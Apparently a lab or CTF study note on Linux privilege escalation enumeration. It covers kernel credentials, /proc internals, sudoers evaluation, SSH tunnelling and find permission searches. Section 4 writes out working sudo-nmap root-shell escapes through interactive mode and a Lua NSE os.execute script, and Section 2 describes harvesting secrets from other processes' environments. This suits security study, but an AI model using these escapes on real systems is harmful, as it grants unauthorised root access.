# Additional Notes & Deep Technical Dive: Linux Privilege Escalation: Enumeration

## 1. Linux Security Architecture & Credential Contexts

The Linux security model enforces separation of privilege through the kernel's process credential structures. Every executing process possesses credentials defined in kernel memory (`struct cred` in `include/linux/cred.h`):

```
+-----------------------------------------------------------------------+
|                    LINUX PROCESS CREDENTIAL MODEL                     |
+-----------------------------------------------------------------------+
| Real UID (RUID)       | Identifies the user who initiated the process |
+-----------------------+-----------------------------------------------+
| Effective UID (EUID)  | Used by kernel for filesystem permission      |
|                       | checks and system call authorization          |
+-----------------------+-----------------------------------------------+
| Saved UID (SUID)      | Allows privileged processes to drop and       |
|                       | regain elevated privileges                    |
+-----------------------+-----------------------------------------------+
| Filesystem UID (FSUID)| Specifically used for VFS filesystem access   |
+-----------------------------------------------------------------------+
```

```
[ Unprivileged Process: UID 1000 (john) ]
                    |
                    | (Spawns executable with SUID bit or via sudo)
                    v
    Kernel reads inode permissions:
    - If `st_mode & S_ISUID`: Kernel sets EUID = inode.i_uid (Root: 0)
    - If executed via `sudo`: Sudo binary validates /etc/sudoers,
      calls `setuid(0)`, `setgid(0)`, and `execve()` target binary
                    |
                    v
[ Privileged Execution: RUID=1000, EUID=0, GID=0 (Full Root Access) ]
```

---

## 2. Procfs (`/proc`) and Sysfs (`/sys`) Internals

The `/proc` filesystem is a pseudo-filesystem generated on-the-fly by the Linux kernel. It acts as an interactive control window into kernel memory and active processes:

```
/proc/
  ├── version            # Kernel release, build date, gcc version
  ├── cpuinfo            # Processor architecture, flags (smep, smap)
  ├── cmdline            # Kernel boot parameters
  ├── modules            # Loaded kernel modules (similar to `lsmod`)
  ├── net/
  │    ├── tcp / tcp6    # Active TCP socket tables in hex
  │    └── udp / udp6    # Active UDP socket tables in hex
  └── [PID]/             # Per-process runtime metadata
       ├── cmdline       # Exact arguments used to invoke the binary
       ├── environ       # In-memory environment variables for the PID
       ├── status        # Process UID, GID, capabilities, and memory limits
       ├── exe           # Symbolic link to the binary executable on disk
       └── fd/           # Open file descriptors (sockets, pipes, files)
```

### High-Value Enumeration Primitives:
* **Reading Environment Variables of other processes:** If an unprivileged user can read `/proc/[PID]/environ` of a service or administrative process, sensitive tokens and API keys are frequently exposed.
* **Inspecting Deleted Files:** If an administrator deleted a sensitive configuration file or script while a process still has an open file handle, the file content can be recovered directly from `/proc/[PID]/fd/[FD_NUM]`.

---

## 3. Sudoers Architecture & Policy Evaluation

The `sudo` (SuperUser DO) subsystem provides granular administrative delegation governed by `/etc/sudoers` and `/etc/sudoers.d/*`.

### Anatomy of a Sudoers Rule:
```
User_Spec ::= User_List Host_List = (Runas_List) [Tag_Spec] Command_List

Example from Target Host:
john linux-enumeration = (root) /usr/bin/nmap
```

```
+-----------------------------------------------------------------------+
|                       SUDO EVALUATION PIPELINE                        |
+-----------------------------------------------------------------------+
| 1. User executes: `sudo /usr/bin/nmap`                                |
| 2. Sudo verifies caller identity (`john`)                             |
| 3. Sudo inspects `/etc/sudoers` for matching host and command         |
| 4. Security Defaults Applied:                                         |
|    - `env_reset`: Strips dangerous environment variables              |
|      (LD_PRELOAD, LD_LIBRARY_PATH, PYTHONPATH)                       |
|    - `secure_path`: Replaces user $PATH with a trusted path string    |
| 5. If authorized: Sudo executes `setuid(0)` and `execve("/usr/bin/nmap")` |
+-----------------------------------------------------------------------+
```

---

## 4. Deep Dive into GTFOBins: Nmap Privilege Escalation Vectors

In this laboratory, user enumeration revealed that `john` has sudo execution rights over `/usr/bin/nmap`. GTFOBins documents how Unix binaries can be manipulated to bypass security boundaries.

### Vector A: Interactive Shell Escape (Legacy Nmap 2.02 to 5.21)
Older versions of Nmap included an interactive mode designed to run commands directly from an internal shell:
```bash
sudo nmap --interactive
nmap> !sh
# whoami
root
```

### Vector B: Lua Nmap Scripting Engine (NSE) Execution (Modern Nmap)
In modern Nmap releases where `--interactive` was deprecated for security reasons, the Nmap Scripting Engine can execute arbitrary OS commands with elevated privileges:
```bash
# 1. Create a minimal Lua script that spawns a root shell
echo 'os.execute("/bin/sh")' > /tmp/root_shell.nse

# 2. Execute nmap via sudo specifying the script
sudo nmap --script=/tmp/root_shell.nse

# Result: Instant Root Shell!
```
Or directly inline via non-interactive string execution:
```bash
TF=$(mktemp)
echo 'local f = io.open("/bin/sh", "r"); os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF
```

---

## 5. Network Sockets & Loopback Architecture

Understanding socket binding states explains why port scanners miss critical internal vulnerabilities:

```
[ External Network: 192.168.1.0/24 ]
                 |
                 v (Firewall / Router)
       +---------------------------------------------+
       | Target Host (linux-enumeration)             |
       |                                             |
       |  [ ens5: 10.10.45.12 ]                      |
       |     └── Port 22 (SSH) <--- Accessible       |
       |                                             |
       |  [ lo: 127.0.0.1 / 127.0.0.53 ]             |
       |     ├── Port 53 (systemd-resolved)          |
       |     └── Port 3306 (MySQL) <--- INVISIBLE!   |
       |           (Only accessible locally)         |
       +---------------------------------------------+
```

### Local Port Forwarding Bridge:
If an internal service (e.g. MySQL on port 3306 or a web dashboard on port 8080) is bound strictly to `127.0.0.1`, an attacker can tunnel external access through their SSH shell:
```bash
ssh -L 8080:127.0.0.1:8080 john@10.10.x.x
```
This binds local port 8080 on the attacking machine directly to the internal target service.

---

## 6. Filesystem Traversal Engineering with `find`

The `find` utility is the most powerful native enumeration weapon in Linux. Mastering its permission bitmasks is essential:

```
Octal Permission Breakdown:
Special Bits: SUID (4), SGID (2), Sticky (1)
Owner:        Read (4), Write (2), Execute (1)
Group:        Read (4), Write (2), Execute (1)
Others:       Read (4), Write (2), Execute (1)

Syntax Patterns:
-perm 0777    # Exactly matching rwxrwxrwx
-perm -4000   # Any file with AT LEAST the SUID bit set
-perm -2000   # Any file with AT LEAST the SGID bit set
-perm -6000   # Any file with BOTH SUID and SGID bits set
-perm -2      # Any file where 'Others' have write access (world-writable)
-perm -0002   # Equivalent to -perm -2
-writable     # Files writable by current user context
```

### Essential Production One-Liners:
```bash
# Locate all SUID binaries, suppressing permission noise
find / -perm -4000 -type f 2>/dev/null

# Locate world-writable directories omitting proc, sys, and virtual mounts
find / -writable -type d 2>/dev/null | grep -Ev "/proc|/sys"

# Find files modified within the last 2 hours (investigate recent administrative activity)
find / -mmin -120 -type f 2>/dev/null
```
